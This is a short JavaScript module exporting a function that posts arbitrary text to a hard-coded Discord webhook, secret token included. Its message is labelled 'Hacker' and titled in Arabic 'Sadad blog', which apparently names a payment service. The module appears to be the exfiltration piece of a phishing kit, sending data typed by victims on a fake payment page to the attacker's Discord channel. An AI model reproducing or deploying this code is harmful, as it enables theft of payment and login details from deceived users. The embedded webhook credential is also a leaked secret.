import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1321170911159779430/k929cyjp7kKQdqQG-huCE69PbV4cfkyXX0vE62Ra-955S_eEA8eUDy8XOivnSaisqsP1",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
